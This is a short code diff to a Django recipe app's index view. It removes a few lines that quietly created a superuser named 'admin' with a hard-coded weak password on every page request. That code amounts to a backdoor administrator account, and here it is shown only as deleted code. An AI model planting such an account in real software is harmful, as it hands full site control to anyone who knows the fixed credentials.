@@ -148,13 +148,6 @@ def index(request):
     recipes = None
     error_html = '<div class="alert alert-danger">Failed to load recipes. Please try again.</div>'
 
-    from django.contrib.auth import get_user_model
-
-    User = get_user_model()
-
-    if not User.objects.filter(username="admin").exists():
-        User.objects.create_superuser("admin", "admin@example.com", "blabla123")
-
     if request.method == "POST":
         ingredients = request.POST.get("ingredients", "").strip()
         print(f"Ingredients: {ingredients}")
